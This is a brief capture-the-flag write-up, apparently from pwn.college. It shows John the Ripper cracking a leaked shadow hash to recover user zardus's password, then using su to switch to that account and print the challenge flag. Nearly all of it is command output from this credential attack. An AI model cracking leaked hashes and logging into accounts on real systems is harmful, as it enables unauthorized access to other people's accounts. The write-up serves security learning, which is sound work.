# Cracking Passwords
## Code:
```bash
hacker@users~cracking-passwords:/challenge$ john ./shadow-leak
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 85% 1/3 0g/s 285.1p/s 285.1c/s 285.1C/s Zardus1111..z99999123456
0g 0:00:00:09 93% 1/3 0g/s 282.9p/s 282.9c/s 282.9C/s zardus999992002..zardus1963
aardvark         (zardus)
1g 0:00:00:20 100% 2/3 0.04909g/s 285.8p/s 285.8c/s 285.8C/s Johnson..buzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
hacker@users~cracking-passwords:/challenge$ su zardus
Password:
zardus@users~cracking-passwords:/challenge$ su zardus
Password:
zardus@users~cracking-passwords:/challenge$ /challenge/run
Congratulations, you have become Zardus! Here is your flag:
pwn.college{kWF17jQRbDkrMYVSGZ6i4nbf1ZP.ddTN0UDL3kzN0czW}
```
## Learning:
 I learnt how to crack passwords in linux
## References:
 did on my own
